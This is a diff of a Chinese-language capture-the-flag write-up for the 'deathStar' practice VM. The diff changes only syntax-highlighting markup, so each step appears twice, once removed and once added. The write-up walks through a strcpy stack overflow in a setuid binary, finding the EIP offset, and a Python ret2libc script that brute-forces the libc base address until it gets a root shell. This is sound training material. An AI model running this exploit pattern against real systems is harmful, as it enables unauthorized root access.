-erso@deathStar1:~$ file /bin/dartVader
-/bin/dartVader: setuid ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=affd50502e973bd3d6d0637028395d87ba695ab9, not stripped
-erso@deathStar1:~$ /bin/dartVader
+erso@deathStar1:<span class="pl-k">~</span>$ file /bin/dartVader
+/bin/dartVader: setuid ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), <span class="pl-k">for</span> GNU/Linux 2.6.24, BuildID[sha1]=affd50502e973bd3d6d0637028395d87ba695ab9, not stripped
+erso@deathStar1:<span class="pl-k">~</span>$ /bin/dartVader
 dartVader: Voce tem um futuro aqui. Nao seja um Lammer, busque e aprenda realmente...
-# 翻译: 达斯·维达：你拥有未来。别做拉默，去探索并真正学习……
-</code></pre>
+<span class="pl-c"><span class="pl-c">#</span> 翻译: 达斯·维达：你拥有未来。别做拉默，去探索并真正学习……</span></pre></div>
 <p>这是一个 32 位 SUID 可执行文件。查看其字符串：</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">erso@deathStar1:~$ strings /bin/dartVader
-# ... (部分输出) ...
+<div class="highlight highlight-source-shell"><pre class="notranslate">erso@deathStar1:<span class="pl-k">~</span>$ strings /bin/dartVader
+<span class="pl-c"><span class="pl-c">#</span> ... (部分输出) ...</span>
 strcpy
-# ...
+<span class="pl-c"><span class="pl-c">#</span> ...</span>
 game3.c
-# ...
-</code></pre>
+<span class="pl-c"><span class="pl-c">#</span> ...</span></pre></div>
 <p>发现 <code class="notranslate">strcpy</code> 函数和源文件名 <code class="notranslate">game3.c</code>，这强烈暗示存在缓冲区溢出漏洞。</p>
 <p>测试缓冲区溢出：</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">erso@deathStar1:~$ /bin/dartVader aaaaaaaaa
-erso@deathStar1:~$ /bin/dartVader aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
-erso@deathStar1:~$ /bin/dartVader aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
-Segmentation fault (core dumped)
-</code></pre>
+<div class="highlight highlight-source-shell"><pre class="notranslate">erso@deathStar1:<span class="pl-k">~</span>$ /bin/dartVader aaaaaaaaa
+erso@deathStar1:<span class="pl-k">~</span>$ /bin/dartVader aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+erso@deathStar1:<span class="pl-k">~</span>$ /bin/dartVader aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+Segmentation fault (core dumped)</pre></div>
 <p>输入大量 'a' 导致段错误，确认存在缓冲区溢出。</p>
 <p>将 <code class="notranslate">/bin/dartVader</code> 文件传输到本地 Kali 进行分析：</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx]
-└─$ scp -P 10110 erso@192.168.205.210:/bin/dartVader .
-# ... (传输成功) ...
-</code></pre>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx]
+└─$ scp -P 10110 erso@192.168.205.210:/bin/dartVader <span class="pl-c1">.</span>
+<span class="pl-c"><span class="pl-c">#</span> ... (传输成功) ...</span></pre></div>
 <p>使用 IDA Pro 反编译 <code class="notranslate">dartVader</code>：</p>
-<pre lang="c" class="notranslate"><code class="notranslate">int __cdecl main(int argc, const char **argv, const char **envp)
+<div class="highlight highlight-source-c"><pre class="notranslate"><span class="pl-smi">int</span> __cdecl <span class="pl-en">main</span>(<span class="pl-smi">int</span> <span class="pl-s1">argc</span>, <span class="pl-k">const</span> <span class="pl-smi">char</span> <span class="pl-c1">*</span><span class="pl-c1">*</span><span class="pl-s1">argv</span>, <span class="pl-k">const</span> <span class="pl-smi">char</span> <span class="pl-c1">*</span><span class="pl-c1">*</span><span class="pl-s1">envp</span>)
 {
-  char dest[64]; // [esp+10h] [ebp-40h] BYREF
+  <span class="pl-smi">char</span> <span class="pl-s1">dest</span>[<span class="pl-c1">64</span>]; <span class="pl-c">// [esp+10h] [ebp-40h] BYREF</span>
 
-  if ( argc == 1 )
-    errx(1, "Voce tem um futuro aqui. Nao seja um Lammer, busque e aprenda realmente...\n");
-  return (int)strcpy(dest, argv[1]);
-}
-</code></pre>
+  <span class="pl-k">if</span> ( <span class="pl-s1">argc</span> <span class="pl-c1">==</span> <span class="pl-c1">1</span> )
+    <span class="pl-en">errx</span>(<span class="pl-c1">1</span>, <span class="pl-s">"Voce tem um futuro aqui. Nao seja um Lammer, busque e aprenda realmente...\n"</span>);
+  <span class="pl-k">return</span> (<span class="pl-smi">int</span>)<span class="pl-en">strcpy</span>(<span class="pl-s1">dest</span>, <span class="pl-s1">argv</span>[<span class="pl-c1">1</span>]);
+}</pre></div>
 <p><code class="notranslate">dest</code> 缓冲区大小为 64 字节。<code class="notranslate">strcpy</code> 将 <code class="notranslate">argv[1]</code> (命令行第一个参数) 复制到 <code class="notranslate">dest</code>，没有长度检查。</p>
 <p>在 GDB 中确定 EIP 覆盖的精确偏移量：</p>
 <ol>
@@ -493,154 +465,145 @@ Segmentation fault (core dumped)
 <li>当程序崩溃时，查看 EIP 寄存器的值。</li>
 <li>使用 <code class="notranslate">pattern_offset.rb</code> (或类似工具) 找到该值在原始字符串中的偏移。</li>
 </ol>
-<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx]
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx]
 └─$ gdb dartVader
-(gdb) set disassembly-flavor intel
-(gdb) run $(/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 80) 
-# 或者手动输入 pattern_create 生成的字符串，如 Aa0Aa1...
+(gdb) <span class="pl-c1">set</span> disassembly-flavor intel
+(gdb) run <span class="pl-s"><span class="pl-pds">$(</span>/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 80<span class="pl-pds">)</span></span> 
+<span class="pl-c"><span class="pl-c">#</span> 或者手动输入 pattern_create 生成的字符串，如 Aa0Aa1...</span>
 Starting program: /mnt/hgfs/gx/dartVader Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9
 [Thread debugging using libthread_db enabled]
-Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+Using host libthread_db library <span class="pl-s"><span class="pl-pds">"</span>/lib/x86_64-linux-gnu/libthread_db.so.1<span class="pl-pds">"</span></span>.
 
 Program received signal SIGSEGV, Segmentation fault.
-0x63413563 in ?? ()
+0x63413563 <span class="pl-k">in</span> <span class="pl-en">??</span> ()
 (gdb) info registers eip
-eip            0x63413563          0x63413563
-</code></pre>
+eip            0x63413563          0x63413563</pre></div>
 <p>EIP 被 <code class="notranslate">0x63413563</code> (ASCII "c5Ac") 覆盖。</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx]
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx]
 └─$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x63413563 -l 80
-[*] Exact match at offset 76
-</code></pre>
+[<span class="pl-k">*</span>] Exact match at offset 76</pre></div>
 <p>偏移量为 76 字节。验证：</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx]
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx]
 └─$ gdb dartVader
-(gdb) run $(python2 -c 'print "A"*76 + "BBBB"')
-Starting program: /mnt/hgfs/gx/dartVader $(python2 -c 'print "A"*76 + "BBBB"')
+(gdb) run <span class="pl-s"><span class="pl-pds">$(</span>python2 -c <span class="pl-s"><span class="pl-pds">'</span>print "A"*76 + "BBBB"<span class="pl-pds">'</span></span><span class="pl-pds">)</span></span>
+Starting program: /mnt/hgfs/gx/dartVader <span class="pl-s"><span class="pl-pds">$(</span>python2 -c <span class="pl-s"><span class="pl-pds">'</span>print "A"*76 + "BBBB"<span class="pl-pds">'</span></span><span class="pl-pds">)</span></span>
 Program received signal SIGSEGV, Segmentation fault.
-0x42424242 in ?? ()
+0x42424242 <span class="pl-k">in</span> <span class="pl-en">??</span> ()
 (gdb) info registers eip
-eip            0x42424242          0x42424242
-</code></pre>
+eip            0x42424242          0x42424242</pre></div>
 <p>EIP 成功被 <code class="notranslate">BBBB</code> (0x42424242) 覆盖。</p>
 <p>检查系统保护机制：</p>
 <ul>
 <li>
 <p>ASLR (地址空间布局随机化):</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">erso@deathStar1:~$ cat /proc/sys/kernel/randomize_va_space
-2
-</code></pre>
+<div class="highlight highlight-source-shell"><pre class="notranslate">erso@deathStar1:<span class="pl-k">~</span>$ cat /proc/sys/kernel/randomize_va_space
+2</pre></div>
 <p>ASLR 完全开启。</p>
 </li>
 <li>
 <p>NX (No-eXecute bit):</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">erso@deathStar1:~$ readelf -W -l /bin/dartVader 
-# ...
+<div class="highlight highlight-source-shell"><pre class="notranslate">erso@deathStar1:<span class="pl-k">~</span>$ readelf -W -l /bin/dartVader 
+<span class="pl-c"><span class="pl-c">#</span> ...</span>
 Program Headers:
   Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align
-# ...
+<span class="pl-c"><span class="pl-c">#</span> ...</span>
   GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x10 
-# ...
-</code></pre>
+<span class="pl-c"><span class="pl-c">#</span> ...</span></pre></div>
 <p><code class="notranslate">GNU_STACK</code> 标志为 <code class="notranslate">RW</code>，表示栈区可读可写但不可执行，NX bit 开启。</p>
 </li>
 </ul>
 <p>由于 ASLR 和 NX 开启，直接注入 shellcode 到栈上执行不可行。采用 Ret2Libc (返回到 libc) 技术。<br>
 由于是 32 位系统，libc 地址虽然随机化，但范围相对较小，可以尝试爆破 libc 基址。</p>
 <p>获取 libc 中 <code class="notranslate">system</code>、<code class="notranslate">exit</code> 函数和 <code class="notranslate">"/bin/sh"</code> 字符串的偏移量：</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">erso@deathStar1:~$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep " system@"
+<div class="highlight highlight-source-shell"><pre class="notranslate">erso@deathStar1:<span class="pl-k">~</span>$ readelf -s /lib/i386-linux-gnu/libc.so.6 <span class="pl-k">|</span> grep <span class="pl-s"><span class="pl-pds">"</span> system@<span class="pl-pds">"</span></span>
   1443: 00040310    56 FUNC    WEAK   DEFAULT   12 system@@GLIBC_2.0
-# system_offset = 0x00040310
+<span class="pl-c"><span class="pl-c">#</span> system_offset = 0x00040310</span>
 
-erso@deathStar1:~$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep " exit@"
+erso@deathStar1:<span class="pl-k">~</span>$ readelf -s /lib/i386-linux-gnu/libc.so.6 <span class="pl-k">|</span> grep <span class="pl-s"><span class="pl-pds">"</span> exit@<span class="pl-pds">"</span></span>
    139: 00033260    45 FUNC    GLOBAL DEFAULT   12 exit@@GLIBC_2.0
-# exit_offset = 0x00033260
+<span class="pl-c"><span class="pl-c">#</span> exit_offset = 0x00033260</span>
 
-erso@deathStar1:~$ strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep "/bin/sh"
+erso@deathStar1:<span class="pl-k">~</span>$ strings -a -t x /lib/i386-linux-gnu/libc.so.6 <span class="pl-k">|</span> grep <span class="pl-s"><span class="pl-pds">"</span>/bin/sh<span class="pl-pds">"</span></span>
  162d4c /bin/sh
-# sh_offset = 0x162d4c
-</code></pre>
+<span class="pl-c"><span class="pl-c">#</span> sh_offset = 0x162d4c</span></pre></div>
 <p>多次运行 <code class="notranslate">ldd /bin/dartVader</code> 观察 libc 基址变化范围，例如：</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">erso@deathStar1:~$ ldd /bin/dartVader 
-        linux-gate.so.1 =&gt;  (0xb7793000)
-        libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xb75d7000) # &lt;--- libc 基址
-        /lib/ld-linux.so.2 (0xb7795000)
-</code></pre>
+<div class="highlight highlight-source-shell"><pre class="notranslate">erso@deathStar1:<span class="pl-k">~</span>$ ldd /bin/dartVader 
+        linux-gate.so.1 =<span class="pl-k">&gt;</span>  (0xb7793000)
+        libc.so.6 =<span class="pl-k">&gt;</span> /lib/i386-linux-gnu/libc.so.6 (0xb75d7000) <span class="pl-c"><span class="pl-c">#</span> &lt;--- libc 基址</span>
+        /lib/ld-linux.so.2 (0xb7795000)</pre></div>
 <p>基址大约在 <code class="notranslate">0xb75xxxxx</code> 到 <code class="notranslate">0xb77xxxxx</code> 之间。</p>
 <p>编写爆破脚本 <code class="notranslate">exp.py</code>：</p>
-<pre lang="python" class="notranslate"><code class="notranslate">#!/usr/bin/env python3
+<div class="highlight highlight-source-python"><pre class="notranslate"><span class="pl-c">#!/usr/bin/env python3</span>
 
-from struct import pack
-from subprocess import call
+<span class="pl-k">from</span> <span class="pl-s1">struct</span> <span class="pl-k">import</span> <span class="pl-s1">pack</span>
+<span class="pl-k">from</span> <span class="pl-s1">subprocess</span> <span class="pl-k">import</span> <span class="pl-s1">call</span>
 
-# 已知偏移量
-system_offset = 0x40310
-exit_offset = 0x33260
-sh_offset = 0x162d4c
+<span class="pl-c"># 已知偏移量</span>
+<span class="pl-s1">system_offset</span> <span class="pl-c1">=</span> <span class="pl-c1">0x40310</span>
+<span class="pl-s1">exit_offset</span> <span class="pl-c1">=</span> <span class="pl-c1">0x33260</span>
+<span class="pl-s1">sh_offset</span> <span class="pl-c1">=</span> <span class="pl-c1">0x162d4c</span>
 
-# 固定目标程序路径
-app = b"/bin/dartVader"
+<span class="pl-c"># 固定目标程序路径</span>
+<span class="pl-s1">app</span> <span class="pl-c1">=</span> <span class="pl-s">b"/bin/dartVader"</span>
 
-# 缓冲区填充长度（根据你的溢出点调整）
-offset = b"A" * 76
+<span class="pl-c"># 缓冲区填充长度（根据你的溢出点调整）</span>
+<span class="pl-s1">offset</span> <span class="pl-c1">=</span> <span class="pl-s">b"A"</span> <span class="pl-c1">*</span> <span class="pl-c1">76</span>
 
-def try_exploit(libc_base):
-    system = pack('&lt;I', libc_base + system_offset)
-    exit_func = pack('&lt;I', libc_base + exit_offset)
-    sh_str = pack('&lt;I', libc_base + sh_offset)
-    payload = offset + system + exit_func + sh_str
-    ret = call([app, payload])
-    return ret == 0
+<span class="pl-k">def</span> <span class="pl-en">try_exploit</span>(<span class="pl-s1">libc_base</span>):
+    <span class="pl-s1">system</span> <span class="pl-c1">=</span> <span class="pl-en">pack</span>(<span class="pl-s">'&lt;I'</span>, <span class="pl-s1">libc_base</span> <span class="pl-c1">+</span> <span class="pl-s1">system_offset</span>)
+    <span class="pl-s1">exit_func</span> <span class="pl-c1">=</span> <span class="pl-en">pack</span>(<span class="pl-s">'&lt;I'</span>, <span class="pl-s1">libc_base</span> <span class="pl-c1">+</span> <span class="pl-s1">exit_offset</span>)
+    <span class="pl-s1">sh_str</span> <span class="pl-c1">=</span> <span class="pl-en">pack</span>(<span class="pl-s">'&lt;I'</span>, <span class="pl-s1">libc_base</span> <span class="pl-c1">+</span> <span class="pl-s1">sh_offset</span>)
+    <span class="pl-s1">payload</span> <span class="pl-c1">=</span> <span class="pl-s1">offset</span> <span class="pl-c1">+</span> <span class="pl-s1">system</span> <span class="pl-c1">+</span> <span class="pl-s1">exit_func</span> <span class="pl-c1">+</span> <span class="pl-s1">sh_str</span>
+    <span class="pl-s1">ret</span> <span class="pl-c1">=</span> <span class="pl-en">call</span>([<span class="pl-s1">app</span>, <span class="pl-s1">payload</span>])
+    <span class="pl-k">return</span> <span class="pl-s1">ret</span> <span class="pl-c1">==</span> <span class="pl-c1">0</span>
 
-# 爆破 libc 地址范围（每次增加 0x1000）
-base_address = 0xb7500000
-end_address = 0xb7700000
+<span class="pl-c"># 爆破 libc 地址范围（每次增加 0x1000）</span>
+<span class="pl-s1">base_address</span> <span class="pl-c1">=</span> <span class="pl-c1">0xb7500000</span>
+<span class="pl-s1">end_address</span> <span class="pl-c1">=</span> <span class="pl-c1">0xb7700000</span>
 
-print("[*] Starting brute-force attack...")
+<span class="pl-en">print</span>(<span class="pl-s">"[*] Starting brute-force attack..."</span>)
 
-found = False
-for addr in range(base_address, end_address, 0x1000):
-    print("[+] Trying libc base: 0x%08x" % addr)
-    if try_exploit(addr):
-        print("[+] Exploit successful!")
-        found = True
-        break
+<span class="pl-s1">found</span> <span class="pl-c1">=</span> <span class="pl-c1">False</span>
+<span class="pl-k">for</span> <span class="pl-s1">addr</span> <span class="pl-c1">in</span> <span class="pl-en">range</span>(<span class="pl-s1">base_address</span>, <span class="pl-s1">end_address</span>, <span class="pl-c1">0x1000</span>):
+    <span class="pl-en">print</span>(<span class="pl-s">"[+] Trying libc base: 0x%08x"</span> <span class="pl-c1">%</span> <span class="pl-s1">addr</span>)
+    <span class="pl-k">if</span> <span class="pl-en">try_exploit</span>(<span class="pl-s1">addr</span>):
+        <span class="pl-en">print</span>(<span class="pl-s">"[+] Exploit successful!"</span>)
+        <span class="pl-s1">found</span> <span class="pl-c1">=</span> <span class="pl-c1">True</span>
+        <span class="pl-k">break</span>
 
-if not found:
-    print("[-] Brute-force failed.")
-</code></pre>
+<span class="pl-k">if</span> <span class="pl-c1">not</span> <span class="pl-s1">found</span>:
+    <span class="pl-en">print</span>(<span class="pl-s">"[-] Brute-force failed."</span>)</pre></div>
 <p>在靶机上运行此脚本（或类似逻辑的脚本）。在爆破过程中，当 libc 基址正确时，<code class="notranslate">system("/bin/sh")</code> 会被调用，从而获得 root shell。<br>
 用户在 <code class="notranslate">0xb7564000</code> 这个基址附近（或就是这个基址）获得了成功。</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">erso@deathStar1:~$ python3 exp.py 
-# ... (爆破过程) ...
+<div class="highlight highlight-source-shell"><pre class="notranslate">erso@deathStar1:<span class="pl-k">~</span>$ python3 exp.py 
+<span class="pl-c"><span class="pl-c">#</span> ... (爆破过程) ...</span>
 [+] Trying libc base: 0xb7564000 
-# (此处脚本可能因 system("/bin/sh") 调用而暂停，或者shell直接接管了终端)
-# id
+<span class="pl-c"><span class="pl-c">#</span> (此处脚本可能因 system("/bin/sh") 调用而暂停，或者shell直接接管了终端)</span>
+<span class="pl-c"><span class="pl-c">#</span> id</span>
 uid=1000(erso) gid=1000(erso) euid=0(root) groups=0(root),1000(erso)
-# cat /root/message.txt
+<span class="pl-c"><span class="pl-c">#</span> cat /root/message.txt</span>
 Art by Shanaka Dias
                     .==.
-                   ()''()-.
-        .---.       ;--; /
-      .'_:___". _..'.  __'.
-      |__ --==|'-''' \'...;
-      [  ]  :[|       |---\
-      |__| I=[|     .'    '.
-      / / ____|     :       '._
-     |-/.____.'      | :       :
-snd /___\ /___\      '-'._----'
-
--------------------------------------
-
-Congratulations!!
-You helped me destroy the empire's weapon.
+                   ()<span class="pl-s"><span class="pl-pds">'</span><span class="pl-pds">'</span></span>()-.
+        .---.       <span class="pl-k">;</span>--<span class="pl-k">;</span> /
+      .<span class="pl-s"><span class="pl-pds">'</span>_:___". _..<span class="pl-pds">'</span></span>.  __<span class="pl-s"><span class="pl-pds">'</span>.</span>
+<span class="pl-s">      |__ --==|<span class="pl-pds">'</span></span>-<span class="pl-s"><span class="pl-pds">'</span><span class="pl-pds">'</span><span class="pl-pds">'</span> \<span class="pl-pds">'</span></span>...<span class="pl-k">;</span>
+      [  ]  :[<span class="pl-k">|</span>       <span class="pl-k">|</span>---\
+      <span class="pl-k">|</span>__<span class="pl-k">|</span> I<span class="pl-k">=</span>[<span class="pl-k">|</span>     .<span class="pl-s"><span class="pl-pds">'</span>    <span class="pl-pds">'</span></span>.
+      / / ____<span class="pl-k">|</span>     <span class="pl-c1">:</span>       <span class="pl-s"><span class="pl-pds">'</span>._</span>
+<span class="pl-s">     |-/.____.<span class="pl-pds">'</span></span>      <span class="pl-k">|</span> <span class="pl-c1">:</span>       <span class="pl-c1">:</span>
+snd /___<span class="pl-cce">\ </span>/___<span class="pl-cce">\ </span>     <span class="pl-s"><span class="pl-pds">'</span>-<span class="pl-pds">'</span></span>._----<span class="pl-s"><span class="pl-pds">'</span></span>
+<span class="pl-s"></span>
+<span class="pl-s">-------------------------------------</span>
+<span class="pl-s"></span>
+<span class="pl-s">Congratulations!!</span>
+<span class="pl-s">You helped me destroy the empire<span class="pl-pds">'</span></span>s weapon.
 
 -------------------------------------
 If you had fun, love to get your feedback.
-Send me a tweet @mrhenrike  ;)
+Send me a tweet @mrhenrike  <span class="pl-k">;</span>)
 
-Until the next VM and "May the force be with you".
-</code></pre>
+Until the next VM and <span class="pl-s"><span class="pl-pds">"</span>May the force be with you<span class="pl-pds">"</span></span>.</pre></div>
 <h3>总结</h3>
 <p>该靶机涉及了多种渗透技巧：</p>
 <ol>
